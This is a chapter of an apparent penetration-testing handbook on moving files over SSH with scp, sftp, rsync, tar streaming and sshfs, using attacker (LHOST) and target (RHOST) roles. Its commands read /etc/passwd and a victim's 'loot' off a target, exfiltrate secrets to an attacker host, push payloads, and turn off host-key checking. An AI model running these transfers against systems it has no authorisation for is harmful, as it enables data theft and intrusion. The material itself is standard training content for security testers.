# 06 - SCP / SFTP

> [← README](../../README.md) · [Next section →](07-netcat.md)

Transferring files over SSH. You need SSH access and `sshd` on the side you connect to. Encryption is built in; no extra server is required.

There are two scenarios. They are separated below so the directions stay clear.

| Scenario | Where `sshd` runs | Where you run the command |
|---|---|---|
| Normal | on the target (`RHOST`) | on the attacker (`LHOST`) |
| Reverse | on the attacker (`LHOST`) | on the target (`RHOST`) |

> **Windows 10+:** the OpenSSH client (`scp.exe`, `sftp.exe`) is usually installed already. The syntax is the same as on Linux. Alternatives: PuTTY (`pscp.exe`, `psftp.exe`) and WinSCP.

> **SSH accounts:** set `LHOST_user` / `RHOST_user` before running the commands below (the full variable block is at the bottom): `export LHOST_user=user RHOST_user=user`. See [README variables](../../README.md#notation-and-variables).

---

## Navigation

|  |  |
|---|---|
| [1. Normal case: sshd on RHOST](#1-normal-case-sshd-on-rhost) | [2. Reverse case: sshd on LHOST](#2-reverse-case-sshd-on-lhost) |
| [3. SFTP](#3-sftp) | [4. rsync over SSH](#4-rsync-over-ssh) |
| [5. Streaming over SSH with tar](#5-streaming-over-ssh-with-tar) | [6. sshfs](#6-sshfs) |
| [7. Diagnostics](#7-diagnostics) |  |

---

## 1. Normal case: sshd on RHOST

Commands run **on LHOST**. `sshd` is on the target; connect as `$RHOST_user@$RHOST`.

### LHOST → RHOST: upload a file to the target

```bash
scp /path/to/payload.sh $RHOST_user@$RHOST:/tmp/payload.sh
```

A whole directory:

```bash
scp -r /path/to/dir $RHOST_user@$RHOST:/tmp/
```

### RHOST → LHOST: pull a file from the target

```bash
scp $RHOST_user@$RHOST:/etc/passwd /tmp/passwd
```

A whole directory:

```bash
scp -r $RHOST_user@$RHOST:/home/victim/loot /tmp/loot
```

### Useful flags

```bash
# non-standard SSH port: scp uses -P, uppercase
scp -P 2222 file $RHOST_user@$RHOST:/tmp/

# key-based auth
scp -i ~/.ssh/id_rsa file $RHOST_user@$RHOST:/tmp/

# compression on a slow link
scp -C largefile $RHOST_user@$RHOST:/tmp/

# limit bandwidth, Kbit/s
scp -l 1000 largefile $RHOST_user@$RHOST:/tmp/

# lab: skip host key checking
scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  file $RHOST_user@$RHOST:/tmp/

# old server does not understand scp over SFTP
scp -O file $RHOST_user@$RHOST:/tmp/
```

### Windows client

OpenSSH in PowerShell/CMD:

```powershell
# LHOST -> RHOST
scp C:\Users\Public\payload.exe ${RHOST_user}@${RHOST}:/tmp/payload.exe

# RHOST -> LHOST
scp ${RHOST_user}@${RHOST}:/path/loot.zip C:\Users\Public\loot.zip
```

PuTTY `pscp.exe`:

```cmd
:: LHOST -> RHOST
pscp.exe -pw SecurePass123 C:\Users\Public\payload.exe %RHOST_user%@%RHOST%:/tmp/payload.exe

:: RHOST -> LHOST
pscp.exe -pw SecurePass123 %RHOST_user%@%RHOST%:/path/loot.zip C:\Users\Public\loot.zip
```

> `-pw` leaves the password in command history and the process list. Use keys for real work.

---

## 2. Reverse case: sshd on LHOST

Commands run **on RHOST**. `sshd` is on the attacker; connect as `$LHOST_user@$LHOST`.

### RHOST → LHOST: exfiltrate a file to the attacker

```bash
scp /home/victim/secrets.zip $LHOST_user@$LHOST:/tmp/secrets.zip
```

### LHOST → RHOST: deliver a file to the target

```bash
scp $LHOST_user@$LHOST:/tmp/payload.sh /tmp/payload.sh
```

> It is the same `scp`; you are just looking at the direction from the target's side. The important part is where the command runs and where `sshd` is listening.

---

## 3. SFTP

Interactive client. Useful when you need to browse directories and pick files.

### Connecting

Normal case — `sshd` on the target, command run from LHOST:

```bash
sftp $RHOST_user@$RHOST
```

Non-standard port:

```bash
sftp -P 2222 $RHOST_user@$RHOST
```

With a key:

```bash
sftp -i ~/.ssh/id_rsa $RHOST_user@$RHOST
```

### Commands inside the session

```text
ls                  # files on the remote side
cd /tmp             # change remote directory

lls                 # files on the local side
lcd /home/victim    # change local directory

get payload.sh      # RHOST -> LHOST
get -r loot         # RHOST -> LHOST, directory

put /etc/passwd     # LHOST -> RHOST
put -r ./loot       # LHOST -> RHOST, directory

mkdir loot
bye
```

`get`/`put` directions depend on which side you connected to:

| Where `sshd` runs | `get` | `put` |
|---|---|---|
| on RHOST | RHOST → LHOST | LHOST → RHOST |
| on LHOST | LHOST → RHOST | RHOST → LHOST |

### Batch mode

`sftp_batch.txt`:

```text
get payload.exe
put /etc/passwd
bye
```

Run it:

```bash
sftp -b sftp_batch.txt $RHOST_user@$RHOST
```

One command via stdin:

```bash
echo "get payload.exe" | sftp $RHOST_user@$RHOST
```

---

## 4. rsync over SSH

The best option for large directories: resumes, synchronizes, compresses.

Normal case — `sshd` on RHOST, command run from LHOST.

```bash
# RHOST -> LHOST
rsync -avz $RHOST_user@$RHOST:/home/victim/loot /tmp/loot

# LHOST -> RHOST
rsync -avz /home/victim/loot $RHOST_user@$RHOST:/tmp/loot
```

Non-standard port:

```bash
rsync -avz -e "ssh -p 2222" \
  $RHOST_user@$RHOST:/home/victim/loot /tmp/loot
```

Custom key and no host-key check:

```bash
rsync -avz -e "ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no" \
  /home/victim/loot $RHOST_user@$RHOST:/tmp/loot
```

Dry run:

```bash
rsync -avzn $RHOST_user@$RHOST:/home/victim/loot /tmp/loot
```

---

## 5. Streaming over SSH with tar

When you do not want an intermediate archive on disk.

```bash
# RHOST -> LHOST: pull a directory
ssh $RHOST_user@$RHOST "tar czf - /home/victim/loot" > secrets.tar.gz

# LHOST -> RHOST: push a directory
tar czf - /home/victim/loot | ssh $RHOST_user@$RHOST "tar xzf - -C /tmp"

# pull a single file to stdout
ssh $RHOST_user@$RHOST "cat /etc/passwd" > passwd
```

---

## 6. sshfs

Mounts a remote filesystem. Useful when there are many files and you want to work with them as if they were local.

```bash
sudo apt install -y sshfs

# mount the target's directory on LHOST
sshfs $RHOST_user@$RHOST:/home/victim /mnt

# non-standard port
sshfs -p 2222 $RHOST_user@$RHOST:/home/victim /mnt

# unmount
fusermount -u /mnt
```

---

## 7. Diagnostics

```bash
# SSH port is open
nc -zv $RHOST 22

# access and authentication
ssh $RHOST_user@$RHOST "id"

# verbose connection log
ssh -vvv $RHOST_user@$RHOST
```

Common mistakes:

- **`scp`/`sftp`: the port flag is `-P`**, uppercase. Lowercase `-p` in `scp` means preserve times.
- **`ssh`/`sshfs`/`rsync -e`: the port flag is `-p`**, lowercase.
- **`sshd` must run on the remote side.** If you run the command on LHOST, `sshd` must be on RHOST. If you run it on RHOST, `sshd` must be on LHOST.
- **Host key prompts break automation.** In a lab: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`.
- **OpenSSH 9+ uses SFTP inside `scp`.** With an old server, try `-O`.
- **Passwords are not entered automatically in non-interactive mode.** Use keys (`ssh-keygen` + `ssh-copy-id`) or `sshpass` (insecure).
- **Windows paths** in `scp.exe` should be written as `C:\path`; quote them if they contain spaces.
- **`rsync` may not be installed** on one side. Fall back to `scp` or `tar` over SSH.

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [07 - Netcat](07-netcat.md)

---

## Variable forms

> `LHOST_user` / `RHOST_user` are SSH accounts. `LHOST` is our machine, `RHOST` is the target.

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export LHOST_user=user    # account on our side
export RHOST_user=user    # account on the target
# usage: $LHOST, $RHOST, $LHOST_user, $RHOST_user
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set LHOST_user=user
set RHOST_user=user
:: usage: %LHOST%, %RHOST%, %LHOST_user%, %RHOST_user%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
$LHOST_user = "user"
$RHOST_user = "user"
# usage: $LHOST, $RHOST, $LHOST_user, $RHOST_user
```

More details: [README](../../README.md#notation-and-variables).

---

[← Back to the handbook](../../README.md)
